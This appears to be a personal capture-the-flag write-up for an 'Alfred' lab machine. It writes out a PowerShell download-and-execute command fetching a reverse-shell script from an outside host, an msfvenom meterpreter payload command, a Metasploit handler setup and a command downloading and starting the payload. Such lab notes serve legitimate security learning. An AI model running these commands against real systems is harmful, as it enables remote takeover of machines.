### Alfred ###

export IP=

found an email on the webserver:alfred@wayneenterprises.com


seems like i have to brute force the login but how is the point because i dont have a destination page...
Took a little help from a writeup:turns out while creating a project there is a build using executing windows command option:
used this command:

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.20.147:8000/rev_shell.ps1');rev_shell


This to generate the rev_shell:

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

in msfconsole: so that msfconsole listenes on 4444:
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.20.147 set LPORT 4444 run


on the shell that i got earlier: 
Simple downloading the meter_rev_shell so that i can get a meterpreter shell instead:
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.20.147:8000/meter_rev_shell.exe','rev_shell.exe')"

Started the process and got the rev_shell:
Start-Process "rev_shell.exe"